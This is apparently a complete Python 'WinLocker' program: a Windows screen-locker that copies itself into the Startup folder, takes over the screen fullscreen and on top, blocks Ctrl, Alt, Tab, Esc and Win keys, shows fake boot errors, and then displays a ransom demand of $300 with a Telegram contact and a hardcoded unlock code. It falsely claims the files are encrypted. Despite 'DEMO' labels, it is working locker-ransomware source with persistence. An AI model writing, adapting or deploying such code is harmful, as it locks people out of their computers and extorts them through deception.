
import tkinter as tk
import random
import winsound
import keyboard
import sys
import os

BLACK = "#000000"
WHITE = "#ffffff"
RED = "#ff0000"
BLUE = "#0000f4"
GREEN = "#9cc9b5"
ORANGE = "#fefefe"

password = "ziD#^TafeOaRjI^9Z@aK"


path = sys.argv[0]
file_name = path.split('\\')[-1]
startup_path = '"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
os.system(f'copy {path} {startup_path}')


root = tk.Tk()
root.title("WinLocker")
root.configure(bg=BLACK)
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)

root.update_idletasks()
x = (root.winfo_screenwidth() - 900) // 2
y = (root.winfo_screenheight() - 520) // 2
root.geometry(f"900x520+{x}+{y}")

keyboard.block_key('tab')
keyboard.block_key('esc')
keyboard.block_key('win')
keyboard.block_key('alt')
keyboard.block_key('ctrl')

lines = [
    "Booting Windows...",
    "Boot error: 0x03527737",
    "Boot error: 0x0266712",
    "Boot error: 0x02897593",
    "Boot error: 0x01447812",
    "Boot error: 0x0150974",
    "Boot error: 0x03873700",
    "Boot error: 0x0700882",
    "Boot error: 0x03803618",
    "Memory section at address 0x0424* is locked!",
    "Service UNCRYPTED started.",
    "",
    "   Windows blocked!"
]

labels = []

boot_frame = tk.Frame(root, bg=BLACK)
boot_frame.pack(fill="both", expand=True)



def block(event):
    return "break"

for key in ["Control_L", "Control_R",
            "Alt_L", "Alt_R",
            "Tab", "Super_L", "Super_R"]:
    root.bind_all(f"<{key}>", block)

def sound():
    winsound.Beep(2000, 600)


for line in lines:
    label = tk.Label(
        boot_frame,
        text="",
        font=("Courier New", 15, "bold"),
        fg=WHITE,
        bg=BLACK,
        anchor="w"
    )
    label.pack(anchor="w", padx=10, pady=0)
    labels.append(label)


def show_line(index):
    if index >= len(lines):
        root.after(500, turn_red)
        return

    labels[index].config(text=lines[index])

    if "Boot error" in lines[index]:
        delay = random.randint(15, 25)
    else:
        delay = random.randint(60, 150)

    root.after(delay, lambda: show_line(index + 1))


def turn_red():
    for label in labels:
        label.config(fg=RED)

    root.after(500, death_screen)

def death_screen():
    boot_frame.destroy()
    root.configure(bg=RED)

    death = r"""
                                       .
                                  .. . . . . ..
                                  .. . . . . ..
                              .. . .   . .    . .
                              .. . . . . .   ....
                          . . ...... . .
                          . . ......            . .
                        . . . .... . .            .
                        . . . .... . .            . .
                        .         .. .                                        0OO00OO
                     .. . . . ....                  .                        0OO00OO00
                     .. .   . ..                    .                        OO00OO0 OO
                     ..     . ..  .                 .                      .OO00OO00OO00
                      . . . . ..  ..                .                      .O00OO00OO0 O
                     .. . . . ......                .                    ...00OO00OO00OO00O
                     .. . . . ......                .                    ///0OO00OO00OO00OO
                      .   . . .. ... .            . .                     // O00OO00OO00OO00O
                   .... . . . ...... .            .                      //  00OO00OO00OO00OO
                    ..               .                                  //    OO  OO00OO00OO00OO0
               . ...... . . . ......       . .. . . .                  //    OO   O00OO00OO00OO00
             .   .... .        .   .   .   .... . . .                 //    OO0   00OO00 O 0 O00O
                 ...... . . . .. . . . .   .  . . . . .              //     O           O00OO00OO00
           .     ...... . . . .. . . . . . . .. . . . . ..          //    //0           00OO00OO00O
           . . . ...... . . . .... . . . . . .. . . . . ..         //     //                0OO00OO00O
         . . . . ...... . . . .. . . . . . . .. . . . . .. .       /     //                 OO00OO00OO
      .. . . .   .... .     . ...... . .   . .. . . . . .     ..///    //                     0OO00OO00O
      ..   .      .   .     . ......   . . ....   . . . ..   ...//     //                     OO00OO00OO
      .. . . . . ...... .   . .... . . . . .  . . . .   .  . .../     //                         OO00OO00O
      ..   . . . .... . .   . ...... . . . .... . . .   .. . .../    //                          O00OO00OO
                            .              . ..         ..     ./   //                             OO00 O0
      .  .   . . .... . . .   .. . . . . . .  . .   . . .. . .../  //                              O00OO00
      .. .       .... .     . ..   .   . . .  .     . .  . .  ..////                               00OO00O
         .   . . .... . .     ..   . . . . .    . . . . .. . ...///                                0OO00OO
         .       ......       ...... . . . .    . . . . .  . ...//                                 OO00OO0
         . . .   ...... . . . .... . .   . .  . . . . . .. . ...///                                  0OO00
         . . .   ...... . . . ..  .. .   . .  . . . . . .    ...///                                  OO00O
         . . . .   .... . . . ....   .   . .  . . . . .  . .   .///                                  O00OO
         . . . .   .... . . . ....   . . . .  . . . . . .. . . .///                                  00OO0
                                     .              . . .        //                                  0OO
           .   . ....   . . . ..  .. . . . .  . . .     .. . . .///                                  OO0
           .      ...   .   .  .   .     .   ..   ..     . . . . //                                   0
             .   ......   . . ..   . . . . .     ..     ..     .///
             . . ......   . . .... . . . . .    ...    ..      ...
             . . .... . .   . .. ... . . .      .     ..        ...
                  . . .     .          .       ..     .         ...
    """

    tk.Label(
        root,
        text=death,
        font=("Courier New", 11, "bold"),
        fg=WHITE,
        bg=RED,
        justify="left",
        anchor="nw"
    ).place(x=10, y=5)

    def transition():
        sound()
        show_menu()

    root.after(900, transition)

def show_menu():
    root.configure(bg=BLUE)

    for widget in root.winfo_children():
        widget.destroy()

    main = tk.Frame(root, bg=BLUE)
    main.place(relx=0.5, rely=0.5, anchor="center",
               width=770, height=350)

    title = tk.Label(
        main,
        text="Oops, your files are encrypted!",
        font=("Courier New", 12, "bold"),
        fg=BLACK,
        bg=WHITE
    )
    title.place(relx=0.5, y=0, anchor="n",
                width=320, height=25)

    info = tk.Frame(
        main,
        bg=BLUE,
        highlightbackground=GREEN,
        highlightthickness=2
    )
    info.place(x=0, y=25, width=770, height=145)

    tk.Label(
        info,
        text=(
            "Your windows is blocked and your files are encrypted.\n"
            "Pay 300$ to get password to unblock your windows."
        ),
        font=("Courier New", 12, "bold"),
        fg=ORANGE,
        bg=BLUE,
        justify="left",
        anchor="w"
    ).place(x=8, y=35)

    tk.Label(
        info,
        text="To get the code, write in Telegram: @example_bot",
        font=("Courier New", 12, "bold"),
        fg=ORANGE,
        bg=BLUE
    ).place(x=8, y=115)

    password_frame = tk.Frame(
        main,
        bg=BLUE,
        highlightbackground=GREEN,
        highlightthickness=2
    )
    password_frame.place(x=0, y=175, width=770, height=100)

    tk.Label(
        password_frame,
        text="Enter the unlock code:",
        font=("Courier New", 13, "bold"),
        fg=WHITE,
        bg=BLUE
    ).pack(pady=(3, 2))

    entry = tk.Entry(
        password_frame,
        font=("Courier New", 17, "bold"),
        bg=WHITE,
        fg=BLUE,
        insertbackground=BLUE,
        justify="center",
        relief="flat"
    )
    entry.pack(fill="x", padx=5, ipady=2)

    tk.Label(
        main,
        text="Current PC: DEMO-7F3A-92BC",
        font=("Courier New", 10),
        fg=WHITE,
        bg=BLUE
    ).place(x=0, y=282)

    result = tk.Label(
        main,
        text="",
        font=("Courier New", 10, "bold"),
        fg=WHITE,
        bg=BLUE
    )
    result.place(x=0, y=310)

    def check_password():
        if entry.get() == password:
            result.config(
                text="DEMO UNLOCKED!",
                fg="#00ff66"
            )
            os.system(f'del {startup_path+file_name}')
            root.destroy()
        else:
            result.config(
                text="Incorrect code!",
                fg=WHITE
            )
            entry.delete(0, tk.END)
            winsound.Beep(2000, 600),

    button = tk.Button(
        main,
        text="Enter",
        font=("Courier New", 12, "bold"),
        fg=BLUE,
        bg=WHITE,
        activeforeground=BLUE,
        activebackground="#cccccc",
        relief="flat",
        command=check_password,
        cursor="hand2"
    )
    button.place(x=610, y=282, width=160, height=28)

    entry.bind("<Return>", lambda event: check_password())
    entry.focus_set()

show_line(0)

root.mainloop()
